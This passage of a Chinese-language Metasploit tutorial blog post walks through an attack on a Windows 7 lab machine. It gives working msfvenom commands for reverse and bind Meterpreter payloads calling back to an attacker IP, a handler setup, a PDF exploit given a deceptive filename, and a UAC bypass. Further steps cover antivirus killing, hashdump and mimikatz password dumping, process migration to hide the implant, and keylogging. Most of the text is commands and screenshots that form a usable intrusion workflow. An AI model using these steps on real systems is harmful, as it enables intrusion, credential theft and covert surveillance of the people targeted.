shell.pl</p></li><li><p>基于pdf的shellcode<br>use exploit/windows/fileformat/adobe_utilprintf<br>msf5 exploit(adobe_utilprintf)&gt;set FILENAME BestComputers-UpgradeInstructions.pdfset</p></li><li><p>PAYLOAD windows/meterpreter/reverse_tcp<br>其他的就自己填就好了</p><p><strong>LHOST 填写的是攻击机器，也就是Kali的IP LPORT 填写的是端口，一般填写的是高端口，如：6666、4444、8977等等，但是 最好填写一下比较常用的端口，如：80、443、8080等等</strong></p></li></ul><p>生成shell.exe： msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=5555 -f exe &gt; shell2.exe</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203012757882.png" alt="image-20220203012757882"></p><p>此时在当前⽬录下有⼀个shell2.exe! 因为在前面说了，这是反向连接，那么就需要先在攻击机器上监听，然 后再然后⾁鸡运⾏我们的文件才可以连接！</p><p>监听模块：<code>use exploit/multi/handler</code></p><p>use exploit/multi/handler </p><p>set PAYLOAD windows/meterpreter/reverse_tcp //这个就是和上面msfvenom使用 的payload是一样的 </p><p>set LHOST 192.168.1.10</p><p>set LPORT 5555</p><p>run</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013100039.png" alt="image-20220203013100039"></p><p>接着我们放到Windows7下去执⾏这个⼆进制文件：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013221508.png" alt="image-20220203013221508"></p><p>最后，来看看Metasploit这边的监听情况：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013247770.png" alt="image-20220203013247770"></p><p>可以看到，Windows7运⾏了刚刚msfvenom⽣成的shell.exe后， Metasploit这边反弹了⼀个meterpreter会话过来！</p><p>这个就是这么⼀个Windows的反向cmdshell 因为刚刚我们所反弹回来了⼀个shell，假设我们要重新监听其他的 payload，那么就可以使⽤background来返回msfconsole控制台窗⼝：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013402729.png" alt="image-20220203013402729"></p><p>如果想查看当前连接的session，就可以使⽤sessions查看在后台有哪些连接 了MSF：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013528739.png" alt="image-20220203013528739"></p><p>如果想进入刚才那个meterperter，那么就sessions后⾯跟他的⼀个id：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203013549137.png" alt="image-20220203013549137"></p><p>这样就进入了刚刚那个cmdshell⾥！</p><h4 id="正向payload"><a href="#正向payload" class="headerlink" title="正向payload"></a>正向payload</h4><ul><li><p>使⽤场景 </p><p>场景还是得具体看，⽐如⽬标机器不给其他除特定端⼝外的端⼝出站，那就 只能能正向；还有⽐如有⼀种情 况，⽬标处于深层⽹络，不能直接连通外⽹，也不能通过其他机器连通，因 为其他机器防⽕墙都开着，为避免 在有防⽕墙监控的情况下关闭防⽕墙⽽被发现，也只能⽤正向的⻢，然后通 过开着防⽕墙的机器来进⾏端⼝的 转发达到穿透的⽬的</p></li></ul><h5 id="msfvenom⽣成正向Paylaod"><a href="#msfvenom⽣成正向Paylaod" class="headerlink" title="msfvenom⽣成正向Paylaod"></a>msfvenom⽣成正向Paylaod</h5><p>msfvenom -p windows/meterpreter/bind_tcp LPORT=<Attack port> -f exe &gt;/root/bind_xx.exe</Attack></p><p>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=<Attack port> -f exe &gt;/root/bind_xx.exe </Attack></p><p>msfvenom -p windows/meterpreter/bind_tcp LPORT=<Attack port> -f dll &gt;/root/bind_xx.dll </Attack></p><p>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=<Attack port> -f dll &gt;/root/bind_xx.dll </Attack></p><p>msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=<Attack port> -f elf &gt;/root/bind_xx.elf </Attack></p><p>msfvenom -p linux/x86/meterpreter/bind_tcp LPORT=<Attack port> -f elf &gt;/root/bind_xx.elf</Attack></p><p>因为我win7虚拟机是x64位系统，我就⽤这条命令：</p><p>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=5555 -f exe &gt;bind.exe</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203234222744.png" alt="image-20220203234222744"></p><p>在虚拟机上运⾏：bind.exe:</p><p>可以看到，已经开放了5555端⼝！</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203234553779.png" alt="image-20220203234553779"></p><p>接下来打开msfconsole对虚拟机进⾏连接(前提是对⽅防火墙是关闭了的)：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203234856726.png" alt="image-20220203234856726"></p><p>其中LPORT需要设置为刚刚我们⽣成的Payload⼀样的端⼝，也就是5555: 还要设置⼀个RHOST，也就是⾁鸡Win7的IP:192.168.1.14 </p><p>最后直接运⾏exoloit</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203234944995.png" alt="image-20220203234944995"></p><p>这个时候就反弹回来了⼀个Meterpreter会话回来！</p><p>同时，⾁鸡win7那边就没有对5555端⼝进⾏连接了！</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203235033556.png" alt="image-20220203235033556"></p><p>因为⽤了5555端⼝启⽤监听后，只会接收⼀次数据，⽆论成功或者失败，它 都不会再监听了！ 也就是说，如果连接失败了，那么就再运⾏然后再连接⼀次！</p><p>这是Metasploit⽣成正向的过程！</p><h5 id="尽量不要⽣成exe"><a href="#尽量不要⽣成exe" class="headerlink" title="尽量不要⽣成exe"></a>尽量不要⽣成exe</h5><p>在真实环境中，如果使⽤msfvenom⽣成了⼀个正向Paylaod格式是exe，那 么在进程中就会暴露！</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203235139085.png" alt="image-20220203235139085"></p><p>⼀般⽤就⽤dll！ </p><p>要运⾏dll必须使⽤rundll32.exe来start: </p><p>rundll32.exe文件在C:/Windows/System32/rundll32.exe:</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203235416805.png" alt="image-20220203235416805"></p><p><em><strong>使用方法就是 rundll32.exe xxx.dll,Start</strong></em></p><p>生成一个dll</p><p>msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=6666 -f dll &gt;bind.dll </p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220203235709952.png" alt="image-20220203235709952"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204000003055.png" alt="image-20220204000003055"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204000015393.png" alt="image-20220204000015393"></p><p>⽽Meterpreter这边也是反弹了⼀个shell回来</p><p>这就是正向连接</p><h3 id="七、msf之Post模块常用演示"><a href="#七、msf之Post模块常用演示" class="headerlink" title="七、msf之Post模块常用演示"></a>七、msf之Post模块常用演示</h3><h4 id="后渗透操作"><a href="#后渗透操作" class="headerlink" title="后渗透操作"></a>后渗透操作</h4><p>在获取到一枚Meterpreter的shell之后，就可以进行下一步的渗透，</p><p>那msf中的post模块就是⼀个后渗透模块，⾥⾯包含各种后渗透中有可能⽤到的功能，最多的就 是信息收集。</p><p>search post</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204000654465.png" alt="image-20220204000654465"></p><p>这边就模拟⼀下拿到cmdshell后的操作：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204000751985.png" alt="image-20220204000751985"></p><p>可以看到，我这边sessions是有⼀个meterpreter会话：</p><p>在后渗透的时候，我们可以使⽤post模块辅助我们</p><h4 id="1、获取目标分区情况"><a href="#1、获取目标分区情况" class="headerlink" title="1、获取目标分区情况"></a>1、获取目标分区情况</h4><blockquote><p>run post/windows/gather/forensics/enum_drives</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204000950563.png" alt="image-20220204000950563"></p><h4 id="2、检测是否是虚拟主机"><a href="#2、检测是否是虚拟主机" class="headerlink" title="2、检测是否是虚拟主机"></a>2、检测是否是虚拟主机</h4><blockquote><p>run post/windows/gather/checkvm</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001018933.png" alt="image-20220204001018933"></p><h4 id="3、获取当前安装的应用程序"><a href="#3、获取当前安装的应用程序" class="headerlink" title="3、获取当前安装的应用程序"></a>3、获取当前安装的应用程序</h4><blockquote><p>run post/windows/gather/enum_applications</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001048275.png" alt="image-20220204001048275"></p><h4 id="4、获取用户登录信息"><a href="#4、获取用户登录信息" class="headerlink" title="4、获取用户登录信息"></a>4、获取用户登录信息</h4><blockquote><p>run post/windows/gather/enum_logged_on_users</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001135734.png" alt="image-20220204001135734"></p><h4 id="5、收集系统环境信息"><a href="#5、收集系统环境信息" class="headerlink" title="5、收集系统环境信息"></a>5、收集系统环境信息</h4><blockquote><p>run post/multi/gather/env</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001323935.png" alt="image-20220204001323935"></p><h4 id="6、查看开启的服务"><a href="#6、查看开启的服务" class="headerlink" title="6、查看开启的服务"></a>6、查看开启的服务</h4><blockquote><p>run post/windows/gather/enum_services</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001409853.png" alt="image-20220204001409853"></p><h4 id="7、查看目标主机最近的操作"><a href="#7、查看目标主机最近的操作" class="headerlink" title="7、查看目标主机最近的操作"></a>7、查看目标主机最近的操作</h4><blockquote><p>run post/windows/gather/dumplinks</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001558473.png" alt="image-20220204001558473"></p><h4 id="8、其他操作"><a href="#8、其他操作" class="headerlink" title="8、其他操作"></a>8、其他操作</h4><p>删除用户</p><blockquote><p>run post/wndows/manage/delete_user username=aiyou</p></blockquote><p>添加账户</p><blockquote><p>run post/windows/manage/enable_rdp USERNAME=aiyou PASSWORD=aiyou</p></blockquote><p>关闭杀软</p><blockquote><p>windows/manage/killav</p></blockquote><h4 id="9、查看目标机安装了哪些应用、补丁"><a href="#9、查看目标机安装了哪些应用、补丁" class="headerlink" title="9、查看目标机安装了哪些应用、补丁"></a>9、查看目标机安装了哪些应用、补丁</h4><blockquote><p>run post/windows/gather/enum_applications</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001701826.png" alt="image-20220204001701826"></p><h4 id="10、对目标进行漏洞扫描-提权操作"><a href="#10、对目标进行漏洞扫描-提权操作" class="headerlink" title="10、对目标进行漏洞扫描(提权操作)"></a>10、对目标进行漏洞扫描(提权操作)</h4><blockquote><p>run post/multi/recon/local_exploit_suggester</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204001748723.png" alt="image-20220204001748723"></p><p>执行之后给了我们很多exploit</p><p>我们就随便挑几个</p><blockquote><p>exploit/windows/local/ms16_014_wmi_recv_notif</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204002328725.png" alt="image-20220204002328725"></p><p>这个提权成功</p><h4 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h4><p>hashdump是查询密码hash： 因为有时候你得搜集密码来进⾏爆破别的⽤户</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204002514895.png" alt="image-20220204002514895"></p><h4 id="信息收集："><a href="#信息收集：" class="headerlink" title="信息收集："></a>信息收集：</h4><ul><li>run post/windows/gather/checkvm #是否虚拟机 </li><li>run post/linux/gather/checkvm #是否虚拟机 </li><li>run post/windows/gather/forensics/enum_drives #查看分区 </li><li>run post/windows/gather/enum_applications #获取安装软件信息 </li><li>run post/windows/gather/dumplinks #获取最近的文件操作</li><li>run post/windows/gather/enum_ie #获取IE缓存 </li><li>run post/windows/gather/enum_chrome #获取Chrome缓存 </li><li>run post/windows/gather/enum_patches #补丁信息 </li><li>run post/windows/gather/enum_domain #查找域控</li></ul><h3 id="八、msf之windows提权-UAC绕过"><a href="#八、msf之windows提权-UAC绕过" class="headerlink" title="八、msf之windows提权_UAC绕过"></a>八、msf之windows提权_UAC绕过</h3><h4 id="什么是UAC"><a href="#什么是UAC" class="headerlink" title="什么是UAC"></a>什么是UAC</h4><p>用户帐户控制（简称UAC）是微软公司在其Windows Vista，及更新版本操作系统中采用 的一种控制机制。通过 本文你将了解它是如何保护你免受恶意软件侵害的，以及忽略UAC 提示将可能给你系统带来的麻烦。</p><p>原理<br>界面操作是：通过询问用户是否授权给应用程序，使用硬盘驱动器和系统文件的权力。以达到阻止恶意程序（“恶意软件”）损坏系统的效果。</p><p>内部逻辑是：</p><p>在触发 UAC 时，操作系统会创建一个consent.exe进程，用来确定是否创建具有管理员权限的进程（通过白名单和用户选择判断），然后creat process。请求进程将要请求的进程cmdline和进程路径，通过LPC接口传递给appinfo的RAiLuanchAdminProcess函数，该函数首先验证路径是否在白名单中，并将结果传递给consent.exe进程，该进程验证被请求的进程签名，以及，发起者的权限，是否符合要求，然后决定是否弹出UAC框，让用户确认。这个UAC框会创建新的安全桌面，遮挡之前的界面。同时这个UAC框进程是SYSTEM账户的进程，其他标准用户进程无法与其通信交互。用户确认之后，会调用CreateProcessAsUser函数，以管理员权限启动请求的进程。</p><p>所以，病毒木马想要实现高权限操作，就不得不绕过UAC弹窗，在没有通知用户情况下, 悄悄地将普通权限，提升为管理员权限启动进程，从而使程序得到高权限的操作。</p><h4 id="UAC实例"><a href="#UAC实例" class="headerlink" title="UAC实例"></a>UAC实例</h4><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204004748652.png" alt="image-20220204004748652"></p><p>可以看到，我sessions有4个，我先进入到⼀个不是系统权限的session：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204004934802.png" alt="image-20220204004934802"></p><p>hashdunm失败，这就是权限问题，我们没有⽤管理员权限运⾏！</p><p>我们来到虚拟机这⾥，右键以管理员权限运⾏就会弹出这个：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005002111.png" alt="image-20220204005002111"></p><p>⽽这个就是UAC! ⽽如果我们⽤了管理员权限运⾏，这个时候就可以hashdump了：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005013882.png" alt="image-20220204005013882"></p><p>有的你运⾏⼀个软件它会弹出⼀个框框问你是否要运⾏：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005023821.png" alt="image-20220204005023821"></p><p>如果你点击确认/是的话，那么你就过了UAC的权限！这个时候就可以进⾏⼀个真正的管理员权限 的操作!</p><h4 id="UAC是如何运作的"><a href="#UAC是如何运作的" class="headerlink" title="UAC是如何运作的"></a>UAC是如何运作的</h4><p>⼀旦程序执⾏涉及系统更改/特定任务就会触发UAC。除非尝试执⾏他们的进程以管理员权限运 行，否则这些操作都将被阻⽌。</p><p>没有管理员权限将无法执⾏以下操作： 注册表修改（如果注册表项位于如HKEY_LOCAL_MACHINE下（因为它影响多个用户），它 将是只读的） 加载设备驱动程序 DLL注入 修改系统时间(clock) 修改⽤户帐户控制设置（通过注册表可以启用/禁用它，但你需要正确的权限才能执行该操 作） 修改受保护的目录（例如Windows文件夹，Program Files） 计划任务（例如，以管理员权限自启动）</p><h4 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass-UAC"></a>Bypass-UAC</h4><p>有的时候我们没有办法以管理员⾝份来运⾏我们的程序，只能以普通⽤户的权限来运⾏，这个时 候怎么来绕过UAC来⽤管理员权限运⾏呢？</p><p>绕过 UAC的方法：</p><ul><li>白名单提权机制；<br>DLL 劫持；<br>Windows 自身漏洞提权；<br>远程注入；<br>COM 接口技术。<br>计划任务</li><li>路径欺骗。</li></ul><p>其余的如通过计划任务、路径欺骗等方式不算入绕过，因为经过了用户确认。</p><p>实现Bypass UAC的方法主要有两种方法：一种是利用白名单提权机制，另一种是利用COM组件接口技术。<br>这里就演示msf里面的bypassuac模块  (现在这些应该是作用不大了)</p><p>其他挨到参考：<a href="https://blog.csdn.net/panjunnn/article/details/106964291">https://blog.csdn.net/panjunnn/article/details/106964291</a></p><p><a href="https://www.cnblogs.com/Yang34/p/12632599.html">https://www.cnblogs.com/Yang34/p/12632599.html</a></p><blockquote><p>search bypassuac</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005349958.png" alt="image-20220204005349958"></p><p>我是先把meterpreter会话放到后台，然后使⽤这个模块：</p><blockquote><p>exploit/windows/local/bypassuac</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005526761.png" alt="image-20220204005526761"></p><p>这边已经运⾏成功了！但是我的虚拟机是x64位的，⽽这个bypassuac是x86,所以不能成功执⾏ hashdump：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005547859.png" alt="image-20220204005547859"></p><p>但是可以执⾏创建或者删除⽤户:</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005558351.png" alt="image-20220204005558351"></p><p>如果⽬标虚拟机是x86的话，就可以执⾏hashdump以及net user创建或者删除⽤户的</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204005622300.png" alt="image-20220204005622300"></p><h3 id="九、msf之系统明文密码和HASH"><a href="#九、msf之系统明文密码和HASH" class="headerlink" title="九、msf之系统明文密码和HASH"></a>九、msf之系统明文密码和HASH</h3><p>这边是绕过 UAC 得到了一个 meterpreter ：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204011031816.png" alt="image-20220204011031816"></p><p>Dump 用户的明文密码 加载 mimikatz ： load mimikatz mimikatz ： 是一个抓取/读取系统密码的工具</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204011136649.png" alt="image-20220204011136649"></p><p>新版msf 抓取密码</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs TypeScript">meterpreter &gt; load kiwi<br>meterpreter &gt; kiwi_cmd privilege::debug<br>meterpreter &gt; kiwi_cmd sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204011453669.png" alt="image-20220204011453669"></p><h3 id="十、msf之进程迁移"><a href="#十、msf之进程迁移" class="headerlink" title="十、msf之进程迁移"></a>十、msf之进程迁移</h3><p>正常使用 exe 上线的情况下，会在任务管理器或者使用 tasklist 命令就可以看到我们 的进程，那么就很容易被发现 所以我们就用把我们的进程迁移到其他原有的进程上面，相当于寄生在别的正常的进程上 面</p><h4 id="手动迁移"><a href="#手动迁移" class="headerlink" title="手动迁移"></a>手动迁移</h4><p>列出所有的进程 ps</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204084835183.png" alt="image-20220204084835183"></p><p>查看当前进程 ： getpid</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204084851654.png" alt="image-20220204084851654"></p><p>以进程名迁移： 迁移到：explorer.exe</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204084912733.png" alt="image-20220204084912733"></p><p>迁移进程成功，我们 ps 查看进程 这个时候就会发现原有的 ：C:/Users/admin/Desktop/8080.exe 这个进程就没有了</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204084937316.png" alt="image-20220204084937316"></p><p>以 PID 迁移：</p><p>假如要迁移到这个 spoolsv.exe ，他的 PID 是 1128 migrate -P 1128</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085005596.png" alt="image-20220204085005596"></p><p>这边的话是迁移失败，原因是权限的问题，因为我运行我的木马exe是没有过UAC的，所以 权限比较小； 而 spoolsv.exe 这个进程是一个系统的权限进程，所以导致迁移进程失败 总结：高权限可以往低权限下迁移进程，低权限不能往高权限上进行迁移！</p><p>我这边重新以 UAC 运行木马</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085038357.png" alt="image-20220204085038357"></p><p>再次迁移进程到 ： spoolsv.exe PID 1128</p><blockquote><p>migrate -P 1128</p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085057415.png" alt="image-20220204085057415"></p><p>这个时候就迁移进程成功了 </p><blockquote><p>meterpreter &gt; getpid </p></blockquote><blockquote><p>Current pid: 1128</p></blockquote><h4 id="上线自动迁移"><a href="#上线自动迁移" class="headerlink" title="上线自动迁移"></a>上线自动迁移</h4><p>迁移到指定进程 set autorunscript migrate -n explorer.exe </p><p>生成一个进程，并迁移到它里面 set AytoRunScript migrate -f</p><p>这边 run 之前，需要设置一下上线后自动迁移到那个进程 </p><blockquote><p>set autorunscript migrate -n explorer.exe </p></blockquote><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085318109.png" alt="image-20220204085318109"></p><p>然后 exploit 运行到后台 ： exploit -j -z </p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085342723.png" alt="image-20220204085342723"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085349953.png" alt="image-20220204085349953"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085358414.png" alt="image-20220204085358414"></p><p>成功迁移进程！</p><p>自动迁移随机进程 set AytoRunScript migrate -f</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085516124.png" alt="image-20220204085516124"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204085525034.png" alt="image-20220204085525034"></p><p>迁移成功！</p><h3 id="十一、msf之键盘记录、屏幕截图、文件操作、load扩展等"><a href="#十一、msf之键盘记录、屏幕截图、文件操作、load扩展等" class="headerlink" title="十一、msf之键盘记录、屏幕截图、文件操作、load扩展等"></a>十一、msf之键盘记录、屏幕截图、文件操作、load扩展等</h3><h4 id="键盘记录"><a href="#键盘记录" class="headerlink" title="键盘记录"></a>键盘记录</h4><p>先是获取到了一个Meterpreter，他有这些功能</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204095822659.png" alt="image-20220204095822659"></p><p>keyscan_start开启键盘监听后，再用keyscan_dump进行记录的导出，如果不想监听了才keyscan_stop。而不是先keyscan_stop再keyscan_dump</p><p>keyscan_start 启动键盘记录监听</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100313768.png" alt="image-20220204100313768"></p><p>目标机器输入东西的话，就可以获取到键盘记录  keyscan_dump</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100639196.png" alt="image-20220204100639196"></p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100646774.png" alt="image-20220204100646774"></p><p>成功获取到键盘记录！</p><p> &lt; Left Windows &gt;&lt; CR &gt;   是回车键</p><p>keyboard_send 输入东西到目标机器上</p><p>假设目标机器上有鼠标指针，那么说明可以输入内容，那我们就可以使用 keyboard_send 来输入东西到目标主机上</p><p>目标目前是空的：</p><p><img src="/2022/02/05/MSF%E6%B8%97%E9%80%8F%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E6%8C%87%E5%8D%97/image-20220204100840309.png" alt="image-20220204100840309"></p><p><img 